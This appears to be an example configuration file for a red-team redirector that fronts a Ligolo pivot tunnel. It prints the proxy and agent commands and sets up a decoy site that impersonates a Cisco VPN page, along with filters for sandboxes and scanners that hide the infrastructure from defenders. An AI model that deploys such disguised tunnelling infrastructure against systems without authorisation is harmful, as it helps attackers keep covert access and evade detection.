@@ -1,0 +1,109 @@
+# ═══════════════════════════════════════════════════════════════════════
+# InfraGuard — Ligolo-ng / Ligolo-mp Tunnel Example
+# ═══════════════════════════════════════════════════════════════════════
+#
+# Front a Ligolo proxy listener with InfraGuard for pivot operations.
+# Ligolo speaks raw TLS (mTLS in mp mode) over a single long-lived TCP
+# connection — not HTTP — so it gets its own dedicated port. The
+# tcp_tunnel listener gates connections with the IP-intel filter, then
+# pipes bytes straight through to the team server. TLS is end-to-end
+# between agent and proxy; the redirector handles ciphertext only.
+#
+# Stack:
+#   Agent → Internet → InfraGuard (11601/tcp) → Ligolo proxy (11601)
+#
+# Operator setup (on the team server):
+#   ./proxy -selfcert -laddr 0.0.0.0:11601
+#     (ligolo-ng, single-operator)
+#
+#   ./ligolo-mp server                                 \
+#     --listen 0.0.0.0:11601                           \
+#     --cert /etc/ligolo-mp/server.crt                 \
+#     --key  /etc/ligolo-mp/server.key
+#     (ligolo-mp, multi-operator)
+#
+# Agent connection through the redirector:
+#   ./agent -connect redirector.example.net:11601 -ignore-cert
+#
+# Required env vars:
+#   INFRAGUARD_DB_PATH    - SQLite path for the tracking DB
+#   LIGOLO_UPSTREAM_HOST  - team server reachable IP (e.g. 10.3.40.1)
+#   LIGOLO_UPSTREAM_PORT  - proxy port on the team server (e.g. 11601)
+#
+# Notes:
+#   * Do NOT colocate this listener on the same port as the HTTP front
+#     (443) unless you add SNI multiplexing in front. Ligolo is not HTTP.
+#   * IP-intel filter is the only guard available pre-handshake. If you
+#     need stricter gating, terminate TLS at InfraGuard and require a
+#     client cert (set tls.cert / tls.key on the listener).
+#   * Long-running connections: idle_timeout_seconds is the silence
+#     threshold, not the total session cap. Ligolo keepalives keep the
+#     stream alive indefinitely under normal pivot use.
+
+listeners:
+  # Primary HTTPS listener (unused by Ligolo, kept for any cover web
+  # traffic / decoy site fronting the same domain).
+  - protocol: "https"
+    bind: "0.0.0.0"
+    port: 443
+    tls:
+      cert: "${INFRAGUARD_TLS_CERT}"
+      key: "${INFRAGUARD_TLS_KEY}"
+    domains:
+      - "vpn.example.net"
+
+  # ── Ligolo tunnel listener ────────────────────────────────────────────
+  - protocol: "tcp_tunnel"
+    bind: "0.0.0.0"
+    port: 11601
+    options:
+      upstream_host: "${LIGOLO_UPSTREAM_HOST}"
+      upstream_port: ${LIGOLO_UPSTREAM_PORT}
+      idle_timeout_seconds: 600       # ligolo keepalive is generous
+      profile: "ligolo_mp"             # tag for tracking events
+
+domains:
+  # Optional cover site so non-tunnel traffic to vpn.example.net gets a
+  # plausible decoy rather than a TCP RST. Browser hits the same domain
+  # over 443; tunnel hits port 11601.
+  vpn.example.net:
+    upstream: "https://127.0.0.1:9999"   # dummy; drop_action handles all
+    profile_type: "passthrough"
+    drop_action:
+      type: "redirect"
+      target: "https://www.cisco.com/c/en/us/products/security/anyconnect-secure-mobility-client/index.html"
+
+pipeline:
+  # tcp_tunnel listener only consults the IP filter — the rest of the
+  # pipeline is HTTP-oriented and bypassed for raw TCP. Keep the HTTP
+  # filters enabled for the cover site on 443.
+  filter_mode: "scoring"
+  block_score_threshold: 0.7
+  enable_ip_filter: true
+  enable_bot_filter: true
+  enable_header_filter: true
+  enable_geo_filter: true
+  enable_dns_filter: true
+  enable_profile_filter: false        # no C2 profile to validate
+  enable_replay_filter: false         # tunnel traffic is opaque + duplicative
+  enable_enumeration_filter: true
+  enable_sandbox_filter: true
+
+intel:
+  auto_block_scanners: true
+  dynamic_whitelist_threshold: 1      # one successful tunnel handshake = trust
+  feeds:
+    enabled: true
+
+tracking:
+  db_path: "${INFRAGUARD_DB_PATH}"
+  retention_days: 30
+
+api:
+  bind: "127.0.0.1"
+  port: 8080
+  health_path: "/up"
+
+logging:
+  level: "INFO"
+  format: "json"
